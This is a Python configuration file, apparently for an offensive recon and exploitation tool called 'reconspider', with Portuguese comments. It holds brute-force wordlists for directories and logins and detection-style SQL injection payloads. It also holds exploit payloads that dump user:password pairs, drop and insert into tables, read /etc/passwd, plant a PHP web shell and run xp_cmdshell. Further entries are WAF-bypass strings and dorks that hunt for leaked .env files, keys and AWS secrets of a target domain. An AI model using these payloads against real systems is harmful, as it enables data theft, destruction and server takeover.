# config.py
# Constantes, wordlists e configurações globais

import os

# User-Agent padrão
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# Timeout padrão para requisições
REQUEST_TIMEOUT = 10

# Número máximo de threads (padrão)
MAX_THREADS = 10

# Portas comuns para scan
COMMON_PORTS = [21, 22, 25, 80, 443, 3306, 5432, 8080, 8443, 9443, 27017]

# Caminhos administrativos comuns
COMMON_ADMIN_PATHS = [
    "/admin", "/administrator", "/login", "/wp-admin", "/user/login",
    "/cpanel", "/phpmyadmin", "/pma", "/myadmin", "/manager/html"
]

# Wordlist para brute force de diretórios (expandida)
DEFAULT_WORDLIST = [
    "admin", "backup", "config", "db", "dev", "download", "files", "include",
    "logs", "private", "secret", "temp", "test", "upload", "vendor", "www",
    ".env", ".git/config", ".htaccess", "wp-config.php", "configuration.php",
    "database", "sql", "mysql", "postgres", "oracle", "dbadmin", "phpmyadmin",
    "pma", "myadmin", "adminer", "administrator", "user", "users", "passwd",
    "password", "creds", "credentials", "auth", "login", "signin", "signup",
    "register", "api", "rest", "graphql", "swagger", "docs", "documentation",
    "readme", "changelog", "license", "COPYING", "INSTALL", "UPGRADE",
    "backup.sql", "backup.tar", "backup.gz", "dump.sql", "db.sql", "data.sql",
    "www.sql", "site.sql", "old", "new", "test", "demo", "example", "sample",
    "dev", "stage", "staging", "prod", "production", "homolog", "homologacao",
    "qa", "quality", "uat", "acceptance", "preprod", "pre-production",
    "beta", "alpha", "release", "final", "version", "v1", "v2", "v3",
    "index", "home", "main", "default", "start", "inicio", "principal",
    "sobre", "about", "contato", "contact", "fale-conosco", "suporte",
    "support", "help", "ajuda", "faq", "perguntas-frequentes", "termos",
    "terms", "privacidade", "privacy", "politica", "policy", "cookies",
    "sitemap", "robots", "crossdomain", "clientaccesspolicy", "web.config",
    "app.config", "application.config", "settings.json", "config.json",
    "config.php", "config.js", "config.py", "config.rb", "config.yaml",
    "config.yml", "config.xml", "database.yml", "database.json",
    "secrets.yml", "secrets.json", "credentials.json", "aws.json",
    "gcp.json", "azure.json", "firebase.json", "google.json", "facebook.json",
    "twitter.json", "github.json", "gitlab.json", "bitbucket.json",
    "docker-compose.yml", "docker-compose.yaml", "Dockerfile", "dockerfile",
    "kubernetes", "k8s", "helm", "chart", "values.yaml", "values.yml",
    "deployment.yaml", "service.yaml", "ingress.yaml", "configmap.yaml",
    "secret.yaml", "persistentvolume.yaml", "pvc.yaml", "namespace.yaml",
    "jenkins", "jenkinsfile", "travis.yml", "circleci", "gitlab-ci.yml",
    "github-actions", "workflows", "actions", "ci", "cd", "pipeline",
    "build", "deploy", "release", "artifact", "package", "dist", "target",
    "out", "output", "build.log", "deploy.log", "release.log", "install.log",
    "error.log", "access.log", "debug.log", "trace.log", "audit.log",
    "security.log", "auth.log", "syslog", "messages", "dmesg", "kernel.log",
    "boot.log", "cron.log", "mail.log", "mysql.log", "postgresql.log",
    "mongodb.log", "redis.log", "elasticsearch.log", "nginx.log", "apache.log",
    "httpd.log", "tomcat.log", "jboss.log", "wildfly.log", "glassfish.log",
    "weblogic.log", "websphere.log", "jetty.log", "netty.log", "undertow.log",
    "node.log", "npm.log", "yarn.log", "bower.log", "grunt.log", "gulp.log",
    "webpack.log", "rollup.log", "parcel.log", "babel.log", "tsc.log",
    "coffee.log", "sass.log", "less.log", "stylus.log", "postcss.log",
    "css.log", "html.log", "js.log", "json.log", "xml.log", "yaml.log",
    "yml.log", "md.log", "markdown.log", "rst.log", "asciidoc.log",
    "tex.log", "latex.log", "bib.log", "bst.log", "cls.log", "sty.log",
    "pdf.log", "ps.log", "eps.log", "svg.log", "png.log", "jpg.log",
    "jpeg.log", "gif.log", "bmp.log", "tiff.log", "ico.log", "webp.log",
    "mp4.log", "mkv.log", "avi.log", "mov.log", "wmv.log", "flv.log",
    "swf.log", "mp3.log", "wav.log", "flac.log", "aac.log", "ogg.log",
    "m4a.log", "wma.log", "zip.log", "rar.log", "7z.log", "tar.log",
    "gz.log", "bz2.log", "xz.log", "lzma.log", "zst.log", "lz4.log",
    "snappy.log", "br.log", "zstd.log", "cab.log", "iso.log", "img.log",
    "vhd.log", "vmdk.log", "vdi.log", "qcow2.log", "ova.log", "ovf.log",
    "bin.log", "dat.log", "raw.log", "dmg.log", "toast.log", "cdr.log",
    "dvd.log", "bluray.log", "mkv.log", "mp4.log", "avi.log", "mov.log",
    "wmv.log", "flv.log", "swf.log", "mp3.log", "wav.log", "flac.log",
    "aac.log", "ogg.log", "m4a.log", "wma.log"
]

# Wordlists para brute force de login (enormes)
DEFAULT_USERLIST = [
    "admin", "root", "user", "test", "guest", "info", "adm", "support",
    "manager", "supervisor", "operator", "sysadmin", "webmaster", "postmaster",
    "administrator", "Admin", "Administrator", "root", "toor", "admin123",
    "password", "123456", "12345678", "1234", "12345", "1234567890",
    "qwerty", "abc123", "letmein", "monkey", "dragon", "baseball", "football",
    "shadow", "master", "superuser", "super", "user1", "user2", "user3",
    "test1", "test2", "test3", "demo", "example", "sample", "guest1",
    "guest2", "guest3", "info1", "info2", "info3", "adm1", "adm2", "adm3",
    "support1", "support2", "support3", "manager1", "manager2", "manager3",
    "supervisor1", "supervisor2", "supervisor3", "operator1", "operator2",
    "operator3", "sysadmin1", "sysadmin2", "sysadmin3", "webmaster1",
    "webmaster2", "webmaster3", "postmaster1", "postmaster2", "postmaster3",
    "administrator1", "administrator2", "administrator3", "Admin1", "Admin2",
    "Admin3", "Administrator1", "Administrator2", "Administrator3", "root1",
    "root2", "root3", "toor1", "toor2", "toor3", "admin1234", "admin12345",
    "admin123456", "admin12345678", "admin1234567890", "password1",
    "password12", "password123", "password1234", "password12345",
    "password123456", "password12345678", "password1234567890", "123456789",
    "123456789a", "123456789b", "123456789c", "qwerty1", "qwerty12",
    "qwerty123", "qwerty1234", "qwerty12345", "qwerty123456", "abc1234",
    "abc12345", "abc123456", "letmein1", "letmein12", "letmein123",
    "letmein1234", "letmein12345", "letmein123456", "monkey1", "monkey12",
    "monkey123", "monkey1234", "monkey12345", "monkey123456", "dragon1",
    "dragon12", "dragon123", "dragon1234", "dragon12345", "dragon123456",
    "baseball1", "baseball12", "baseball123", "baseball1234", "baseball12345",
    "baseball123456", "football1", "football12", "football123", "football1234",
    "football12345", "football123456", "shadow1", "shadow12", "shadow123",
    "shadow1234", "shadow12345", "shadow123456", "master1", "master12",
    "master123", "master1234", "master12345", "master123456", "superuser1",
    "superuser12", "superuser123", "superuser1234", "superuser12345",
    "superuser123456", "super1", "super12", "super123", "super1234",
    "super12345", "super123456", "user123", "user1234", "user12345",
    "user123456", "test123", "test1234", "test12345", "test123456", "demo123",
    "demo1234", "demo12345", "demo123456", "example123", "example1234",
    "example12345", "example123456", "sample123", "sample1234", "sample12345",
    "sample123456", "guest123", "guest1234", "guest12345", "guest123456",
    "info123", "info1234", "info12345", "info123456", "adm123", "adm1234",
    "adm12345", "adm123456", "support123", "support1234", "support12345",
    "support123456", "manager123", "manager1234", "manager12345",
    "manager123456", "supervisor123", "supervisor1234", "supervisor12345",
    "supervisor123456", "operator123", "operator1234", "operator12345",
    "operator123456", "sysadmin123", "sysadmin1234", "sysadmin12345",
    "sysadmin123456", "webmaster123", "webmaster1234", "webmaster12345",
    "webmaster123456", "postmaster123", "postmaster1234", "postmaster12345",
    "postmaster123456", "administrator123", "administrator1234",
    "administrator12345", "administrator123456"
]

DEFAULT_PASSLIST = DEFAULT_USERLIST  # pode usar a mesma ou uma lista maior de senhas comuns

# Payloads SQL Injection para detecção (mantido)
SQLI_PAYLOADS = {
    'error_based': {
        'mysql': ["'", "\"", "1' AND 1=1--", "1' AND 1=2--", "' OR '1'='1", "' OR 1=1--", "admin'--", "' OR '1'='1'/*", "' OR 1=1#", "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--", "1' GROUP BY 1--", "1' GROUP BY 2--", "1' GROUP BY 3--", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--", "' UNION ALL SELECT 1,2,3--", "' UNION SELECT 1,@@version,3--"],
        'mssql': ["'", "\"", "1' AND 1=1--", "1' AND 1=2--", "' OR '1'='1", "'; WAITFOR DELAY '00:00:05'--", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--", "' UNION ALL SELECT 1,2,3--", "' UNION SELECT 1,@@version,3--"],
        'oracle': ["'", "\"", "1' AND 1=1--", "1' AND 1=2--", "' OR '1'='1", "' UNION SELECT NULL FROM DUAL--", "' UNION SELECT NULL,NULL FROM DUAL--", "' UNION SELECT NULL,NULL,NULL FROM DUAL--", "' UNION ALL SELECT 1,2,3 FROM DUAL--", "' UNION SELECT 1,@@version,3 FROM DUAL--"],
        'postgresql': ["'", "\"", "1' AND 1=1--", "1' AND 1=2--", "' OR '1'='1", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--", "' UNION ALL SELECT 1,2,3--", "' UNION SELECT 1,version(),3--"],
        'generic': ["'", "\"", "1' AND 1=1", "1' AND 1=2", "' OR '1'='1", "admin'--", "' OR 1=1--", "' OR 1=1#", "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--"]
    },
    'union_based': {
        'generic': [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION ALL SELECT 1,2,3--",
            "' UNION ALL SELECT 1,2,3,4--",
            "' UNION ALL SELECT 1,2,3,4,5--",
            "' UNION SELECT 1,@@version,3--",
            "' UNION SELECT 1,version(),3--",
            "' UNION SELECT 1,user(),3--",
            "' UNION SELECT 1,database(),3--",
            "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
            "1' ORDER BY 4--", "1' ORDER BY 5--", "1' GROUP BY 1--",
            "1' GROUP BY 2--", "1' GROUP BY 3--", "1' GROUP BY 4--", "1' GROUP BY 5--"
        ]
    },
    'boolean_based': {
        'generic': [
            "1' AND '1'='1", "1' AND '1'='2",
            "' AND 1=1--", "' AND 1=2--",
            "' OR 1=1--", "' OR 1=2--",
            "1' AND 1=1--", "1' AND 1=2--",
            "' AND '1'='1", "' AND '1'='2",
            "1' AND 1=1 AND '1'='1", "1' AND 1=2 AND '1'='1"
        ]
    },
    'time_based': {
        'mysql': ["' AND SLEEP(5)--", "1' AND SLEEP(5)--", "' OR SLEEP(5)--", "' AND SLEEP(5) AND '1'='1", "' OR SLEEP(5) OR '1'='1"],
        'mssql': ["'; WAITFOR DELAY '00:00:05'--", "1'; WAITFOR DELAY '00:00:05'--", "'; WAITFOR DELAY '00:00:05' AND '1'='1", "'; WAITFOR DELAY '00:00:05' OR '1'='1"],
        'postgresql': ["'; SELECT pg_sleep(5)--", "1'; SELECT pg_sleep(5)--", "'; SELECT pg_sleep(5) AND '1'='1", "'; SELECT pg_sleep(5) OR '1'='1"],
        'oracle': ["' AND dbms_pipe.receive_message(('a'),5)--", "1' AND dbms_pipe.receive_message(('a'),5)--", "' OR dbms_pipe.receive_message(('a'),5)--"],
        'generic': ["' AND SLEEP(5)--", "1' AND SLEEP(5)--", "' OR SLEEP(5)--"]
    }
}

SQLI_EXPLOIT_PAYLOADS = {
    'mysql': [
        "' UNION SELECT 1,@@version,3--",
        "' UNION SELECT 1,user(),3--",
        "' UNION SELECT 1,database(),3--",
        "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
        "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--",
        "' UNION SELECT 1,concat(user,':',password),3 FROM users--",
        "'; DROP TABLE users--",  # cuidado!
        "'; INSERT INTO users (user, password) VALUES ('hacker', 'hacked')--",
        "' AND 1=0 UNION SELECT 1,load_file('/etc/passwd'),3--",
        "' AND 1=0 UNION SELECT 1,'<?php system($_GET[cmd]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--"
    ],
    'mssql': [
        "'; EXEC xp_cmdshell('whoami')--",
        "' UNION SELECT 1,@@version,3--",
        "' UNION SELECT 1,db_name(),3--",
        "' UNION SELECT 1,name,3 FROM sysdatabases--",
        "' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--",
        "' UNION SELECT 1,name,3 FROM syscolumns WHERE id=OBJECT_ID('users')--"
    ],
    'oracle': [
        "' UNION SELECT 1,user,3 FROM dual--",
        "' UNION SELECT 1,version,3 FROM v$instance--",
        "' UNION SELECT 1,table_name,3 FROM all_tables--",
        "' UNION SELECT 1,column_name,3 FROM all_tab_columns WHERE table_name='USERS'--"
    ],
    'postgresql': [
        "'; SELECT pg_sleep(5)--",
        "' UNION SELECT 1,version(),3--",
        "' UNION SELECT 1,current_database(),3--",
        "' UNION SELECT 1,tablename,3 FROM pg_tables WHERE schemaname='public'--",
        "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--"
    ],
    'generic': [
        "' UNION SELECT 1,@@version,3--",
        "' UNION SELECT 1,user(),3--",
        "' UNION SELECT 1,database(),3--",
        "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
        "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--",
        "' UNION SELECT 1,concat(user,':',password),3 FROM users--"
    ]
}

# Payloads para bypass de WAF
WAF_BYPASS_PAYLOADS = [
    # Bypass com comentários
    "'/**/OR/**/1=1--",
    "'/*!50000OR*/1=1--",
    "' OR 1=1 #",
    "' OR 1=1/*",
    # Bypass com encoding
    "%27%20OR%201=1--",
    "%2527%2520OR%25201=1--",
    # Bypass com case variation
    "' Or 1=1--",
    "' oR 1=1--",
    # Bypass com concatenação
    "'||'1'='1",
    "'&&'1'='1",
    # Bypass com operadores alternativos
    "' xor 1=1--",
    "' rlike '.*'--",
    # Bypass com funções
    "' AND SLEEP(5) AND '1'='1",
    "' OR BENCHMARK(1000000,MD5('a'))--",
]

# Fontes de dorks (repositório Proviesec)
DORK_SOURCES = [
    "https://raw.githubusercontent.com/Proviesec/google-dorks/main/all-google-dorks.txt",
    "https://raw.githubusercontent.com/Proviesec/google-dorks/main/best-google-dorks.txt",
    "https://raw.githubusercontent.com/Proviesec/google-dorks/main/google-dorks-best-log.txt",
    "https://raw.githubusercontent.com/Proviesec/google-dorks/main/google-dorks-for-env-files.txt",
    "https://raw.githubusercontent.com/Proviesec/google-dorks/main/google-dorks-for-git-files.txt",
    "https://raw.githubusercontent.com/Proviesec/google-dorks/main/google-dorks-for-database-files.txt",
    "https://raw.githubusercontent.com/Proviesec/google-dorks/main/google-dorks-for-backups.txt",
    "https://raw.githubusercontent.com/Proviesec/google-dorks/main/google-dorks-for-login.txt",
    "https://raw.githubusercontent.com/Proviesec/google-dorks/main/google-dorks-for-js-secrets.txt",
]

THIRD_PARTY_DORKS = [
    "site:pastebin.com \"{dominio}\"",
    "site:gist.github.com \"{dominio}\"",
    "site:github.com \"{dominio}\" \"password\" OR \"api_key\" OR \"secret\" OR \"token\"",
    "site:github.com \"{dominio}\" filename:.env",
    "site:github.com \"{dominio}\" extension:pem",
    "site:github.com \"{dominio}\" AWS_SECRET_ACCESS_KEY",
    "site:docs.google.com \"{dominio}\"",
    "site:slideshare.net \"{dominio}\"",
    "site:scribd.com \"{dominio}\"",
    "site:*.{dominio}",
    "site:*.*.{dominio}",
]

# Caminho para o arquivo de log (opcional, pode ser definido no main)
LOG_FILE = os.path.join(os.path.dirname(__file__), "reconspider.log")